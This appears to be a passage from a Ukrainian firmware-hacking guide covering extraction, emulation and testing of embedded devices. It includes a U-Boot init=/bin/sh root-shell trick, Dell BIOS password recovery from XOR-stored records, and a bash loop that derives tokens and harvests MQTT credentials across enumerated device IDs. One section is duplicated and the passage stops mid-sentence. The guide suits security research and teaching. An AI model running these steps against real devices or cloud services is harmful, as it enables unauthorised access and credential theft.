Прошивка — це важливе програмне забезпечення, яке забезпечує правильну роботу пристроїв, керуючи зв’язком між апаратними компонентами та програмним забезпеченням, з яким взаємодіють користувачі, і забезпечуючи цей зв’язок. Вона зберігається в постійній пам’яті, щоб пристрій міг отримати доступ до важливих інструкцій одразу після ввімкнення, що дає змогу запустити операційну систему. Аналіз і потенційна модифікація прошивки — важливий крок для виявлення вразливостей безпеки.<sup>[[2]](#references)[[3]](#references)</sup>

## **Збір інформації**

**Збір інформації** — важливий початковий крок для розуміння будови пристрою та використаних у ньому технологій. Цей процес передбачає збір даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Особливості bootloader
- Апаратну конфігурацію та datasheet
- Метрики кодової бази та розташування вихідного коду
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень і сертифікати відповідності нормативним вимогам
- Архітектурні діаграми та діаграми потоків
- Оцінки безпеки та виявлені вразливості

Для цього незамінними є інструменти **open-source intelligence (OSINT)**, а також аналіз будь-яких доступних компонентів програмного забезпечення з відкритим вихідним кодом за допомогою ручного й автоматизованого аналізу. Такі інструменти, як [Coverity Scan](https://scan.coverity.com) і [LGTM від Semmle](https://lgtm.com/#explore), надають безкоштовний статичний аналіз, який можна використовувати для пошуку потенційних проблем.

## **Отримання прошивки**

Прошивку можна отримати різними способами, кожен із яких має власний рівень складності:

- **Безпосередньо** від джерела (розробників, виробників)
- **Зібрати** її за наданими інструкціями
- **Завантажити** з офіційних сайтів підтримки
- Використовувати запити **Google dork**, щоб знаходити розміщені файли прошивки
- Отримати прямий доступ до **cloud storage** за допомогою таких інструментів, як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехоплювати **оновлення** за допомогою атак man-in-the-middle
- **Витягти** прошивку з пристрою через з’єднання на кшталт **UART**, **JTAG** або **PICit**
- **Перехоплювати** запити на оновлення в обміні даними пристрою
- Виявляти та використовувати **жорстко закодовані кінцеві точки оновлення**
- **Створювати дамп** із bootloader або мережі
- **Витягувати та зчитувати** мікросхему пам’яті, якщо інші способи не спрацювали, використовуючи відповідні апаратні засоби

### Логи лише через UART: примусовий запуск root shell через U-Boot env у flash

Якщо UART RX ігнорується (є лише логи), усе одно можна примусово запустити init shell, **відредагувавши blob середовища U-Boot офлайн**:<sup>[[6]](#references)</sup>

1. Створіть дамп SPI flash за допомогою кліпси SOIC-8 і програматора (3,3 В):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Знайдіть розділ env U-Boot, відредагуйте `bootargs`, додавши `init=/bin/sh`, і **перерахуйте CRC32 env U-Boot** для blob.
3. Перепрошийте лише розділ env і перезавантажте пристрій; у UART має з’явитися shell.

Це корисно для вбудованих пристроїв, де shell завантажувача вимкнено, але розділ env можна записувати через зовнішній доступ до флеш-пам’яті.

## Аналіз прошивки

Тепер, коли у вас **є прошивка**, потрібно витягти з неї інформацію, щоб знати, як із нею працювати. Для цього можна скористатися різними інструментами:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Якщо за допомогою цих інструментів не вдасться знайти багато даних, перевірте **ентропію** образу за допомогою `binwalk -E <bin>`: якщо вона низька, образ навряд чи зашифрований. Якщо ентропія висока, образ, імовірно, зашифрований (або стиснений у якийсь спосіб).

### Диференційний аналіз flash-пам’яті та відновлювані сховища секретів XOR

Якщо формат зберігання налаштування firmware не задокументований, спочатку зробіть кілька зчитувань однакової flash-пам’яті, змініть **рівно одне** налаштування, знову зчитайте весь чип і порівняйте зміщення. Повторення експерименту з контрольованими значеннями допоможе відрізнити дані налаштування від лічильників і метаданих запису; зміни за новими зміщеннями, а не на місці, свідчать про сховище з додаванням записів або журналюванням. Зберігайте видалені записи й записи tombstone, оскільки їхні байти даних можуть залишатися придатними для відновлення.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Після визначення області витягніть модулі firmware за допомогою таких інструментів, як `binwalk`, і проведіть reverse engineering writer/validator у Ghidra. Підтвердьте межі полів, padding, індексацію ключа та виведення ключа за кодом, а не лише за закономірностями в ciphertext.<sup>[[12]](#references)</sup>

#### Відновлення ключів із зашифрованого нульового padding

Як описано в [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), відомий відкритий текст дає змогу визначити байти keystream на тих самих позиціях. Поле фіксованого розміру особливо вразливе, коли його нульовий padding охоплює всі позиції повторюваного XOR-ключа: зашифрований padding безпосередньо розкриває ці байти ключа, оскільки `0x00 XOR key_byte = key_byte`. Якщо охоплено всі позиції ключа, відновіть ключ із кінця ciphertext і розшифруйте заповнені байти.<sup>[[12]](#references)</sup>

Вразливий формат пароля BIOS DVAR від Dell — конкретний приклад: байт `0` поля завдовжки 32 байти зберігається у відкритому вигляді, а для байтів `1..31` використовується повторюваний 20-байтовий ключ.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Для пароля довжиною `L` позиції `L..31` були нульовими до застосування XOR. Коли `L <= 12`, ці позиції охоплюють усі індекси ключа, тож повний ключ і пароль можна відновити без brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Відновлення ключів із історичних записів

Не аналізуйте кожен запис окремо. Ключ DVAR приблизно обчислюється як `modified_md5(device_seed || variable_GUID || password[0])`: seed пристрою та GUID є фіксованими, а єдиний залежний від пароля вхідний параметр — перший байт у відкритому вигляді. Це дає не більше 256 ключів на пристрій, тож записи, що починаються з однакового байта, використовують спільний ключ. Згрупуйте активні та видалені записи за цим байтом; короткий історичний запис може призвести до leak повного ключа через padding і розшифрувати поточний довший запис, якому бракує padding. Тому ротація пароля може збільшити ризик, якщо старі шифротексти лише позначено як видалені, а не стерто.<sup>[[12]](#references)</sup>

Інструмент [`dellpwn`](https://github.com/R3n5k1/dellpwn) знаходить DVAR, перевіряє записи-кандидати, відновлює паролі та може показувати необроблені байти збережених даних і ключів. Зберіть його зі скопійованого репозиторію та проскануйте перевірений образ flash-пам’яті так:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Для власних парсерів відхиляйте хибнопозитивні результати за структурою записів, обмеженнями на друковані символи, перевірками нульового заповнення, ентропією ключа та узгодженістю в місцях циклічного повторення ключа. Якщо повторні дампи показують рідкісні зміни бітів під час кожного запису, перелічіть спостережувані маски й ранжуйте можливі виправлення з урахуванням цих обмежень, але повідомляйте про неоднозначні символи, а не подавайте евристичний результат як точне відновлення.<sup>[[12]](#references)</sup>

Замість оборотного шифротексту у верифікаторах паролів слід зберігати хеш із сіллю, обчислений за допомогою односторонньої функції з ітераціями, а в журналах із послідовним записом слід безпечно видаляти застарілі секретні дані.<sup>[[12]](#references)</sup>

### Отримання файлової системи

За допомогою згаданих раніше інструментів із коментарями, наприклад `binwalk -ev <bin>`, ви мали змогу **витягти файлову систему**.\
Зазвичай Binwalk витягує її до **теки з назвою типу файлової системи**. Зазвичай це один із таких типів: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне витягування файлової системи

Іноді у сигнатурах binwalk **немає magic byte файлової системи**. У таких випадках скористайтеся binwalk, щоб **знайти зсув файлової системи й вирізати стиснену файлову систему** з бінарного файла, а потім **витягти файлову систему вручну** відповідно до її типу, використовуючи наведені нижче кроки.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Виконайте наведену нижче **команду dd**, щоб вилучити файлову систему Squashfs методом карвінгу.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Також можна виконати таку команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується у прикладі вище)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у каталозі "`squashfs-root`".

- Файли архіву CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs із NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Відновлення розділених вбудованих кореневих файлових систем

Якщо дамп raw eMMC/SSD містить коректний заголовок файлової системи, але її зміщення метаданих виходять за межі номінального розділу, не класифікуйте її одразу як пошкоджену. Вбудований код завантаження може збирати реальний кореневий пристрій із кількох фізичних діапазонів за допомогою Device Mapper, тому вилучення даних з одного розділу GPT дає лише перший сегмент.<sup>[[9]](#references)</sup>

#### Перевірка повного образу носія

Спершу переконайтеся, що отримання даних завершено, розмір стабільний і жоден процес запису більше не використовує образ. Якщо ім’я файлу містить адресу початку й кінця, порівняйте цей діапазон із фактичним розміром у байтах. Відновіть GPT у режимі лише для читання та підключіть лише потрібний діапазон; **не** запускайте `vgchange -ay` для ненадійного фізичного тому на робочій станції, оскільки можливі конфлікти груп томів і ненавмисний запис.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Використовуйте одноразову VM, якщо вихідна логіка init або стек LVM має працювати з повним образом. Історичні журнали завантаження зі стандартного розділу завантаження особливо корисні: завантажувач міг записати offsets контейнера proprietary-формату, довжини компонентів, вибір слота, правила вирівнювання та перевірку підпису. Використайте ці значення, щоб витягти вбудовані командний рядок, ядро та initramfs, а потім окремо перевірте кожен результат за допомогою `file`, magic bytes і `binwalk`; читання до кінця контейнера може випадково додати до ядра initrd, об’єкт ACPI або підпис.<sup>[[9]](#references)</sup>

#### Відновіть карту блоків під час завантаження

Витягніть initramfs ядра та виконайте reverse engineering його `/init` і будь-яких бібліотек сховища. У [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) знайдіть посилання на рядки `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` і шляхи до розділів; потім простежте код, який вибирає активний слот A/B і будує таблицю. Корисні команди radare2 для початку: `r2 -A init`, `afl`, `pdf @ main` і `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Ціль linear зіставляє послідовні діапазони віртуального пристрою з діапазонами одного або кількох базових пристроїв. Відновлена таблиця з двох сегментів зазвичай має такий вигляд (усі позиції та довжини задано в секторах по 512 байтів):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Відтворюйте арифметику машинного коду точно, зокрема розрядність цілих чисел, зсуви та перетворення одиниць. Наприклад, наведений вираз спочатку округлює розмір у байтах донизу до межі 4 КіБ, а вже потім перетворює його на сектори по 512 байтів; заміна на `p4_bytes // 512` зміщує вибраний хвостовий фрагмент на `p4_bytes % 4096`, якщо розділ не вирівняно за сторінкою.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Відновіть плоский образ для аналізу, копіюючи діапазони в порядку таблиці обмеженими блоками, а не завантажуючи повний дамп носія в пам’ять. Це також дає змогу не створювати хостові пристрої mapper. Перевіряйте зсуви, отримані з GPT, обернені кількості секторів і результівну довжину вихідного файла окремими твердженнями.<sup>[[9]](#references)</sup>

#### Відрізняйте пошкодження від постійної помилки реконструкції

Для SquashFS перевірте magic `hsqs` і декодуйте 64-бітне поле `bytes_used` у форматі little-endian за зсувом 40 від початку суперблока, перш ніж запускати `unsquashfs`. Якщо під час видобування виникають помилки в кількох не пов’язаних структурах, виконайте пошук у широкому вікні навколо очікуваних позицій і вимагайте надійних структурних ознак: блок метаданих, який можна розпакувати; кілька послідовних коректних записів каталогу; правдоподібні поля inode; кореневий inode, узгоджений із кількістю inode; або коректну структуру метаданих цілісності. Одного збігу magic недостатньо.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Коли та сама знакова дельта робить валідними незалежні структури — наприклад, метадані каталогу й запис verity, — імовірна причина полягає в систематичній помилці початку сегмента, а не у відсутніх байтах. Поверніться до зворотної арифметики й перевірте, чи не було відкинуто залишки, чи правильно оброблено знаковість і переповнення, а також округлення до секторів або сторінок, перш ніж намагатися відновити втрачені дані чи виправляти метадані файлової системи.<sup>[[9]](#references)</sup>

Нарешті, розрізняйте межі захисту: томи LUKS, ключі яких запечатані в TPM, захищають конфіденційність даних, тоді як підписане зіставлення dm-verity захищає цілісність кореневої файлової системи. Програмний TPM не відновить ключ, запечатаний у вихідному фізичному TPM, а завантаження модифікованого SquashFS через init, призначений лише для досліджень і такий, що пропускає перевірку verity, не підробляє його підпис і не зламує dm-verity.<sup>[[9]](#references)</sup>

## Аналіз прошивки

Після отримання прошивки важливо дослідити її структуру та потенційні вразливості. Для цього використовують різні інструменти, щоб проаналізувати й витягти цінні дані з образу прошивки.

### Інструменти для початкового аналізу

Наведено набір команд для початкового огляду двійкового файла (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, витягти рядки, проаналізувати двійкові дані та з’ясувати відомості про розділи й файлову систему:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Щоб оцінити стан шифрування образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія свідчить про відсутність шифрування, а висока — про можливе шифрування або стиснення.

Для вилучення **вбудованих файлів** рекомендуються такі інструменти й ресурси, як документація **file-data-carving-recovery-tools** і **binvis.io** для перевірки файлів.

### Вилучення файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна вилучити файлову систему, часто в каталог із назвою її типу (наприклад, squashfs, ubifs). Однак, якщо **binwalk** не розпізнає тип файлової системи через відсутність магічних байтів, її потрібно вилучити вручну. Для цього за допомогою `binwalk` знаходять зміщення файлової системи, а потім командою `dd` вирізають її з образу:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Після цього для ручного видобування вмісту використовують різні команди залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs).

### Аналіз файлової системи

Після видобування файлової системи починається пошук вразливостей. Особливу увагу приділяють незахищеним мережевим демонам, жорстко закодованим обліковим даним, кінцевим точкам API, функціям сервера оновлень, нескомпільованому коду, скриптам запуску та скомпільованим бінарним файлам для офлайн-аналізу.

**Ключові розташування** та **елементи** для перевірки:

- **etc/shadow** і **etc/passwd** — облікові дані користувачів
- SSL-сертифікати та ключі в **etc/ssl**
- Файли конфігурації та скрипти на предмет потенційних вразливостей
- Вбудовані бінарні файли для подальшого аналізу
- Поширені вебсервери та бінарні файли IoT-пристроїв

Для виявлення конфіденційної інформації та вразливостей у файловій системі можна скористатися кількома інструментами:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку конфіденційної інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для комплексного аналізу прошивки
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) і [**EMBA**](https://github.com/e-m-b-a/emba) для статичного та динамічного аналізу

### Перевірка безпеки скомпільованих бінарних файлів

На вразливості потрібно перевіряти і вихідний код, і скомпільовані бінарні файли, знайдені у файловій системі. Такі інструменти, як **checksec.sh** для бінарних файлів Unix і **PESecurity** для бінарних файлів Windows, допомагають виявити незахищені бінарні файли, які можна експлуатувати.

## Отримання хмарної конфігурації та облікових даних MQTT за допомогою похідних URL-токенів

Багато IoT-хабів отримують конфігурацію для кожного пристрою з хмарної кінцевої точки такого вигляду:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу прошивки можна виявити, що `<token>` локально генерується на основі ідентифікатора пристрою з використанням жорстко закодованого секрету, наприклад:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Така схема дає змогу будь-кому, хто дізнається deviceId і STATIC_KEY, відновити URL і завантажити хмарну конфігурацію, яка часто містить облікові дані MQTT у відкритому тексті та префікси топіків.

Практичний порядок дій:

1) Отримайте deviceId з журналів завантаження UART

- Під’єднайте адаптер UART на 3,3 В (TX/RX/GND) і перехопіть журнали:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Знайдіть рядки, що виводять шаблон URL-адреси конфігурації хмари та адресу брокера, наприклад:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Відновіть STATIC_KEY і алгоритм токена з прошивки

- Завантажте бінарні файли в Ghidra/radare2 і пошукайте шлях до конфігурації ("/pf/") або використання MD5.
- Підтвердьте алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Обчисліть токен у Bash і переведіть дайджест у верхній регістр:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Зберіть хмарну конфігурацію та облікові дані MQTT

- Сформуйте URL і отримайте JSON за допомогою curl; розберіть його за допомогою jq, щоб витягти секрети:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Зловживайте незашифрованим MQTT і слабкими ACL для топіків (якщо такі є)

- Використовуйте відновлені облікові дані, щоб підписатися на топіки обслуговування та шукати конфіденційні події:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Переберіть передбачувані ідентифікатори пристроїв (у масштабі, з дозволом)

- У багатьох екосистемах вбудовано байти OUI/продукту/типу виробника, за якими йде послідовний суфікс.
- Можна перебирати кандидатні ID, програмно генерувати токени й отримувати конфігурації:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Нотатки
- Завжди отримуйте явний дозвіл перед масовим перебиранням.
- Якщо можливо, надавайте перевагу емуляції або статичному аналізу для отримання секретів без модифікації цільового обладнання.

Емуляція firmware дає змогу виконувати **динамічний аналіз** роботи пристрою або окремої програми. Такий підхід може зіткнутися з труднощами через залежності від обладнання чи архітектури, але перенесення root filesystem або окремих бінарних файлів на пристрій із відповідною архітектурою та порядком байтів, наприклад Raspberry Pi, або на попередньо створену віртуальну машину може спростити подальше тестування.

### Емуляція окремих бінарних файлів

Для аналізу окремих програм важливо визначити порядок байтів і архітектуру CPU програми.

#### Приклад з архітектурою MIPS

Для емуляції бінарного файла з архітектурою MIPS можна скористатися командою:

```bash
file ./squashfs-root/bin/busybox
```

А щоб установити необхідні інструменти емуляції:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Для MIPS (big-endian) використовується `qemu-mips`, а для little-endian бінарних файлів підійде `qemu-mipsel`.

#### Емуляція архітектури ARM

Для бінарних файлів ARM процес аналогічний: для емуляції використовується емулятор `qemu-arm`.

### Повна емуляція системи

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, забезпечують повну емуляцію прошивки, автоматизуючи цей процес і допомагаючи під час динамічного аналізу.

### Відновлення розділених і перевірених кореневих файлових систем для емуляції

Якщо суперблок SquashFS читається, але зміщення inode, каталогів або таблиці фрагментів неможливі, не поспішайте виправляти `unsquashfs`. Проведіть реверс-інжиніринг бінарного файлу раннього завантаження та відтворіть граф блочних пристроїв, який він створює: вбудовані системи можуть мати номінальний кореневий розділ, але створювати реальну файлову систему за допомогою мапінгу `dm-linear`, який додає сектори, запозичені з іншого розділу. Перевірки лише суперблока можуть проходити успішно, навіть якщо всі наступні блоки метаданих зміщені.<sup>[[11]](#references)</sup>

Точно відтворіть арифметику прошивки. Зокрема, з’ясуйте, чи довжини задані в байтах, секторах по 512 байтів або сторінках по 4 КіБ; відтворіть зсуви й усічення в початковому порядку; врахуйте залежні від банку хвостові області в схемах A/B. Наприклад, `(partition_bytes >> 12) << 3` спершу округлює значення до межі 4 КіБ, відкидаючи залишок, і лише потім виражає результат у секторах по 512 байтів; заміна на `partition_bytes // 512` може змістити доданий екстент на кілька кілобайтів і пошкодити всі наступні таблиці SquashFS.<sup>[[11]](#references)</sup>

Корисний процес перевірки:<sup>[[11]](#references)</sup>

1. Відновіть для кожного сегмента `dm-linear` вихідний пристрій, початковий сектор і довжину за бінарним файлом верифікатора/init.
2. Об’єднайте екстенти або зіставте їх, не змінюючи правил вирівнювання.
3. Якщо витягування все ще не вдається, шукайте лише в невеликому діапазоні навколо прогнозованої межі та вимагайте наявності кількох послідовних коректних структур метаданих, а не покладайтеся лише на правдоподібний суперблок.
4. Запустіть незмінений `unsquashfs` для відновленого образу; успішний обхід усіх каталогів і фрагментів є переконливішим доказом, ніж `unsquashfs -stat`.

#### Заміна dm-verity під контролем аналітика

Якщо аналітик контролює ядро QEMU, initramfs і віртуальні диски, модифіковану кореневу файлову систему можна завантажити, замінивши PID 1 верифікації виробника невеликим статично скомпонованим init. Це **заміна ланцюжка завантаження в лабораторному середовищі**, а не злам dm-verity, його підпису RSA, Secure Boot чи ключа, запечатаного в TPM.<sup>[[11]](#references)</sup>

Замінний init має відтворювати операційні частини початкового процесу завантаження: змонтувати `devtmpfs`, викликати `setsid()`, під’єднати `/dev/console` до файлових дескрипторів 0–2, змонтувати `/proc` і `/sys`, дочекатися наданого блочного пристрою, змонтувати відредаговану кореневу файлову систему лише для читання, від’єднати псевдофайлові системи старого кореня, перемістити нове монтування в `/`, виконати `chroot` і `execve()` для початкового `/sbin/init` прошивки. Від’єднання `/dev`, `/proc` і `/sys` **до** `MS_MOVE` запобігає випадковому від’єднанню точок монтування, що належать новій кореневій файловій системі.<sup>[[11]](#references)</sup>

Зберігайте змінний стан пристрою окремо від модифікованої незмінної кореневої файлової системи. Оверлей qcow2 може зберегти стан LVM початкового диска, тоді як другий диск virtio лише для читання надає відредагований SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Налагодження стану образу офлайн

Перевіряйте постійний стан поза гостьовою системою, якщо повільне завантаження, руйнівні скрипти запуску або ненадійне журналювання консолі ускладнюють пошук причини збою. Ніколи не підключайте оверлей, який використовує запущена VM; надайте до нього доступ через `qemu-nbd`, обмежте пошук LVM потрібним розділом NBD і деактивуйте групу томів перед від’єднанням.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Для повторюваної локалізації несправностей записуйте файли-маркери з часовими мітками на стабільний том із можливістю запису та перевіряйте їх офлайн; `/dev/kmsg`, FIFO та тимчасові консолі можуть спричиняти хибнонегативні результати через обмеження частоти повідомлень або передчасне завершення процесу. Також порівнюйте точні інтерфейси між рівнями, перш ніж змінювати не пов’язаний із проблемою код: `uname -r` і `/lib/modules/`, функції ext4 на диску та конфігурацію ядра, а також покоління Mesa `libGL` з ABI DRI-драйвера й назвами драйверів, визначеними на основі PCI. Компонент може існувати й навіть успішно завантажуватися через `dlopen()`, але залишатися непридатним до використання, бо його споживач очікує інший ABI.<sup>[[11]](#references)</sup>

## Практичний динамічний аналіз

На цьому етапі для аналізу використовують реальне або емульоване середовище пристрою. Важливо зберігати доступ до shell ОС і файлової системи. Емуляція може не повністю відтворювати взаємодію з апаратним забезпеченням, тому час від часу може знадобитися перезапуск емуляції. Під час аналізу слід повторно досліджувати файлову систему, експлуатувати відкриті вебсторінки та мережеві служби, а також вивчати вразливості завантажувача. Перевірки цілісності firmware мають вирішальне значення для виявлення потенційних вразливостей, пов’язаних із бекдорами.

## Методи аналізу під час виконання

Аналіз під час виконання передбачає взаємодію з процесом або бінарним файлом у середовищі його роботи, використовуючи такі інструменти, як gdb-multiarch, Frida та Ghidra, для встановлення точок зупинки й виявлення вразливостей за допомогою fuzzing та інших методів.

Для вбудованих цілей, де немає повноцінного налагоджувача, **скопіюйте статично скомпонований `gdbserver`** на пристрій і під’єднайтеся до нього віддалено:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Відображення повідомлень Zigbee / радіоспівпроцесора

У IoT-хабах RF-стек часто розділений між **радіо MCU** і процесом userland у Linux. Корисний робочий процес — відстежити шлях:<sup>[[8]](#references)</sup>

1. **RF-кадр** у радіоефірі
2. **Парсер на боці контролера** в радіо MCU
3. **Текстовий або TLV-протокол через serial/UART**, який передається до Linux (наприклад, `/dev/tty*`)
4. **Диспетчер застосунку** в основному daemon
5. **Обробник, специфічний для протоколу / машина станів**

Така архітектура створює дві цілі для реверсингу замість однієї. Якщо контролер перетворює бінарні радіокадри на текстовий протокол на кшталт `Group,Command,arg1,arg2,...`, визначте:

- **Групи повідомлень** і таблиці диспетчеризації
- Які повідомлення можуть надходити з **мережі**, а які — від самого контролера
- Точні **поля-дискримінатори виробника** (наприклад, Zigbee `manufacturer_code` і власний `cluster_command`)
- Які обробники доступні лише під час **commissioning**, виявлення або завантаження firmware/моделі

Для Zigbee перехопіть трафік сполучення та перевірте, чи ціль усе ще використовує стандартний **Link Key** `ZigBeeAlliance09`. Якщо так, перехоплення commissioning-трафіку може розкрити **Network Key**. Коди встановлення Zigbee 3.0 зменшують цей ризик, тож зафіксуйте, чи тестований пристрій справді вимагає їх використання.

### Обробники протоколу виробника та доступність, обмежена FSM

Специфічні для виробника команди Zigbee/ZCL часто є кращою ціллю, ніж стандартизовані кластери, оскільки вони потрапляють у **власний код парсингу** та внутрішні **FSM**, валідацію яких перевіряли менш ретельно.<sup>[[8]](#references)</sup>

Практичний робочий процес:

- Виконуйте реверсинг диспетчера команд, доки не знайдете **обробник, доступний лише виробнику**.
- Відновіть таблиці **станів FSM**, **подій**, **перевірок**, **дій** і **наступних станів**.
- Визначте **перехідні стани** з автоматичним переходом далі, а також гілки повторних спроб/помилок, які зрештою скидають або звільняють контрольований атакувальником стан.
- З’ясуйте, які легітимні обміни протоколу потрібні, щоб перевести daemon у вразливий стан, замість того щоб вважати, ніби проблемний обробник завжди доступний.

Для протоколів, чутливих до часу, відтворення пакетів із Python-фреймворку може бути надто повільним. Надійніший підхід — емулювати легітимний пристрій на реальному обладнанні (наприклад, **nRF52840**) із використанням стека виробничого рівня, щоб забезпечити правильні **ендпоїнти**, **атрибути** й часове узгодження commissioning.

### Клас помилок у daemon вбудованих систем під час фрагментованого завантаження

Поширений клас помилок firmware трапляється під час **фрагментованого завантаження blob/моделі/конфігурації**:<sup>[[8]](#references)</sup>

1. **Перший фрагмент** (`offset == 0`) зберігає `ctx->total_size` і виділяє пам’ять через `malloc(total_size)`.
2. Наступні фрагменти перевіряють лише контрольовані атакувальником **локальні для пакета** поля, наприклад `packet_total_size >= offset + chunk_len`.
3. Копіювання виконується через `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки щодо **початкового розміру виділеної пам’яті**.

Це дає атакувальнику змогу надіслати:

